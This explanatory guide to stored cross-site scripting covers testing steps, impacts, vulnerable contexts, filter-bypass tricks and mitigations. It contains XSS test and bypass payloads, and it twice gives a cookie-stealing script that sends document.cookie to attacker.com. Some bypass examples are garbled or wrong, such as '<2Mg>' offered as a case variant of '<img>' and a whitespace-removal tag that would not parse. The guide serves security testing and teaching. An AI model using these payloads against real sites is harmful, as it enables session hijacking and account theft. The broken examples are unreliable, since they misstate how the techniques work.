### Stored Cross-Site Scripting (XSS) Overview

**Key Points:**
- Stored XSS, or persistent XSS, involves malicious scripts stored on a server that execute in users’ browsers when accessed, posing significant risks like session hijacking.
- Testing involves injecting test payloads into input fields and checking if they persist and execute, often using tools like Burp Suite.
- Impacts include stealing user data, spreading malware, or escalating privileges, especially if administrators are targeted.
- It can occur in forums, user profiles, or logs, and attackers may bypass filters using obfuscation or encoding techniques.
- While highly dangerous, proper input validation and output encoding can mitigate risks, though some debate exists on the effectiveness of certain filters.

**What is Stored XSS?**  
Stored XSS occurs when an attacker injects malicious scripts into a web application, which are saved on the server (e.g., in a database) and later displayed to users. When users view the affected page, the script runs in their browser, potentially stealing data or performing unauthorized actions. It’s particularly dangerous because it doesn’t require users to click a malicious link, unlike reflected XSS.

**How to Test for It**  
To test for stored XSS, try entering scripts like `<script>alert('test')</script>` into fields like comments or profiles. Check if the script is saved and runs when the page is viewed. Tools like [Burp Suite](https://portswigger.net/burp) or [OWASP ZAP](https://www.zaproxy.org) can help automate this. Also, test file uploads or logs to see if they can store and execute scripts.

**Why It Matters**  
Stored XSS can lead to serious issues, such as stealing login credentials, spreading malware, or even taking over admin accounts. For example, a script in a forum post could steal cookies from every user who views it, compromising their accounts.

**Where It Happens**  
This vulnerability often appears in social platforms, forums, or any feature where users submit content that’s displayed to others, like user profiles or message boards. Even admin dashboards showing user data can be at risk.

**Bypassing Protections**  
Attackers may evade filters by disguising scripts, such as using `<img onerror="alert(1)">` instead of `<script>`, or encoding characters to trick the system. Testing different encodings or splitting scripts across fields can reveal weaknesses.

### Comprehensive Guide to Stored Cross-Site Scripting (XSS)

Stored Cross-Site Scripting (XSS) is a critical web application vulnerability that allows attackers to inject malicious scripts into a server, which are then executed in the browsers of unsuspecting users. This section provides an in-depth exploration of stored XSS, including its definition, testing methodologies, impact assessment, contexts, and techniques to bypass filters, drawing from authoritative sources like *The Web Application Hacker’s Handbook* and OWASP resources.

#### Definition
Stored XSS, also known as persistent or Type-II XSS, occurs when malicious scripts are permanently stored on a server, such as in a database, message forum, comment section, or visitor log. These scripts are served to users who access the affected content, executing in their browsers without requiring further interaction from the attacker. Unlike reflected XSS, which relies on a single request-response cycle, stored XSS persists, making it particularly dangerous as it can affect multiple users over time. For instance, in an auction site, an attacker might post a question containing `<script>alert(document.cookie)</script>`, which executes for any user viewing the question, potentially stealing their session tokens.

#### Testing Methodologies
Testing for stored XSS requires a systematic approach to identify vulnerabilities across various input points and contexts. The following steps outline a comprehensive testing strategy:

1. **Identify Input Points:** Locate all areas where user input is collected and stored, including comment fields, user profiles, forum posts, shopping carts, file uploads, and application logs.
2. **Inject Test Payloads:** Submit unique, benign test strings (e.g., `xgxssestamq1vp`) or malicious scripts (e.g., `<script>alert('XSS')</script>`) into these fields. Use distinct strings for each parameter to track where data appears.
3. **Check Persistence:** Verify if the input is stored by navigating to pages or features where the data might be displayed, such as user profiles, message boards, or admin dashboards.
4. **Observe Execution:** Confirm if the script executes in the browser when the stored data is rendered. For example, if `<script>alert(1)</script>` triggers a pop-up, the application is vulnerable.
5. **Test Multi-Step Processes:** Complete workflows like user registration or order placement to ensure data is stored and displayed unsafely across multiple requests.
6. **Investigate Out-of-Band Channels:** Check non-web interfaces, such as email inputs in web mail systems, where user data is received and rendered as HTML.
7. **Test File Uploads:** Upload files containing HTML or scripts (e.g., set MIME type to `text/html` with `<script>alert(1)</script>`) and verify if they execute when downloaded or viewed.
8. **Use Tools:** Employ tools like [Burp Suite](https://portswigger.net/burp), [OWASP ZAP](https://www.zaproxy.org), [BeEF](https://www.beefproject.com), or [XSS Hunter](https://github.com/mandatoryprogrammer/xsshunter) to automate testing and monitor HTTP traffic. For blind XSS, where the payload is stored but not immediately visible, XSS Hunter can detect execution in feedback forms or logs.
9. **Gray-Box Testing:** If partial access to the backend is available, analyze how input is stored and processed. Check source code for variables like PHP’s `$_POST` or Java’s `request.getParameter` to identify sanitization gaps.

**Example Test Payload Artifact:**

<script>alert('XSS')</script>
<img src="x" onerror="alert(1)">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<a href="javascript:alert(1)">Click</a>


#### Building Impact
Stored XSS vulnerabilities can have devastating consequences due to their persistent nature and ability to affect multiple users. Key impacts include:

- **Session Hijacking:** Attackers can steal session cookies, allowing them to impersonate users. For example, a script like `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>` sends cookies to an attacker-controlled server.
- **Automated Attacks:** Persistent payloads execute every time a user visits the compromised page, enabling continuous attacks without further interaction. This is particularly effective in authenticated areas where users are logged in.
- **Worm Propagation:** As seen in the 2005 MySpace attack, stored XSS can create self-propagating worms. A script in a user profile might copy itself to other profiles, spreading exponentially.
- **Privilege Escalation:** If an administrator views the compromised data, the attacker can hijack their session, gaining full control over the application. For instance, a script in a user’s display name could execute when an admin views a user list.
- **Chaining with Other Vulnerabilities:** Stored XSS can amplify other flaws, such as defective access controls. An attacker might use XSS to modify a user’s profile data, exploiting an access control vulnerability to target all users.

| **Impact Type**         | **Description**                                                                 | **Example**                                                                 |
|-------------------------|--------------------------------------------------------------------------------|-----------------------------------------------------------------------------|
| Session Hijacking       | Stealing session tokens to access user accounts.                               | `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>` |
| Worm Propagation        | Self-replicating scripts that spread across users.                             | MySpace worm adding attacker as friend and copying script to victim profiles. |
| Privilege Escalation    | Gaining admin access by targeting high-privilege users.                       | Script in user data executes in admin dashboard, stealing admin session.     |
| Chaining Vulnerabilities | Combining XSS with other flaws for greater impact.                            | XSS in display name + access control flaw to compromise all users.           |

#### Contexts for Stored XSS
Stored XSS vulnerabilities can manifest in various application contexts, particularly in features involving user-generated or stored content. Common contexts include:

- **User Interaction Features:** Applications like forums, auction sites, or social networks where users post content (e.g., comments, questions, or messages) are prime targets. For example, a malicious script in a forum post could affect all viewers.
- **Administrative Interfaces:** Data visible to administrators, such as user records, logs, or feedback, can be exploited if not sanitized. A script in a log entry might execute when an admin views it.
- **Personal Information Fields:** Fields like names, addresses, or email addresses displayed on user profiles or contact lists can harbor XSS payloads.
- **Uploaded Content:** Files uploaded by users, such as profile pictures or attachments, may contain malicious HTML or scripts that execute when rendered in the browser.
- **Out-of-Band Channels:** Data received via non-web interfaces, like emails in web mail applications, can introduce XSS if rendered as HTML. Web mail systems are particularly vulnerable due to their handling of third-party HTML.
- **Application Logs and Metadata:** Data like HTTP Referer, User-Agent, or filenames logged by the application and displayed in-browser can be exploited if not properly sanitized.

#### Bypassing Filter Techniques
Web applications often implement filters to prevent XSS, but attackers can use various techniques to bypass them. These methods exploit weaknesses in filter logic or browser behavior:

1. **Signature-Based Filter Bypasses:**
   - **Alternative Script Tags and Syntax:** Use tags like `<object>` or Base64-encoded scripts (e.g., `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`).
   - **Event Handlers:** Inject scripts via event handlers like `onerror`, `onload`, or `onmouseover` (e.g., `<img src="x" onerror="alert(1)">`).
   - **NULL Bytes:** Insert NULL bytes (e.g., `%00`) to confuse filters, particularly in older browsers like Internet Explorer.

2. **HTML Obfuscation:**
   - **Case Manipulation:** Vary tag case (e.g., `<2Mg>` instead of `<img>`).
   - **Whitespace Removal:** Remove spaces or use alternative characters (e.g., `<imgonerror="alert(1)"src=a>`).
   - **HTML Encoding:** Encode characters (e.g., `<` as `&lt;` or Unicode `&#x3c;`) to evade detection, leveraging browser tolerance for malformed HTML.

3. **Character Set Exploits:**
   - Use non-standard encodings like UTF-7 or Shift-JIS to represent malicious code (e.g., `+ADw-script+AD4-alert(1)+ADw-/script+AD4-` in UTF-7).

4. **Sanitization Bypasses:**
   - **Recursive Sanitization Checks:** Test if filters remove only the first instance of a pattern (e.g., submit `<script><script>alert(1)</script></script>`).
   - **Order of Operations:** Exploit sanitization sequence (e.g., if `<script>` is stripped before `<object>`, try `<script><object>alert(1)</object></script>`).
   - **Escaped Character Manipulation:** If quotes are escaped with backslashes, check if backslashes are escaped, allowing payloads like `foo\';alert(1);//`.

5. **Spanning Payloads:** Split payloads across multiple fields or parameters to reconstruct a script in the response.
6. **VBScript and Hybrid Approaches:** Use VBScript (e.g., `<script language="vbs">MsgBox 1</script>`) or combine JavaScript and VBScript to bypass JavaScript-specific filters.
7. **Out-of-Band Delivery:** For non-web channels like email, craft raw messages with obfuscated payloads using tools like `sendmail`.

**Example Bypass Artifact:**

<img src="x" onerror="alert(1)">
<2Mg OnErRoR="alert(1)" SrC=a>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
foo\';alert(1);//


#### Mitigation Strategies
While not directly requested, understanding mitigations can inform testing and impact assessment. OWASP recommends:
- **Input Validation:** Restrict input to expected formats using allowlists.
- **Output Encoding:** Encode data before rendering in HTML, JavaScript, or URLs (e.g., use [OWASP AntiSamy](https://owasp.org/www-project-antisamy)).
- **Content Security Policy (CSP):** Restrict script sources to trusted domains.
- **Sanitization:** Use libraries like DOMPurify to sanitize HTML.
- **Framework Protections:** Leverage modern frameworks with built-in XSS defenses, but verify their effectiveness.

#### Controversies and Challenges
Some debate exists around the effectiveness of XSS filters, as they can be bypassed with sophisticated techniques, as outlined above. Additionally, the reliance on client-side protections like CSP can be undermined by misconfigurations or legacy systems. The balance between usability (allowing rich user content) and security (restricting HTML) remains a challenge, particularly in applications like web mail or CMS platforms.
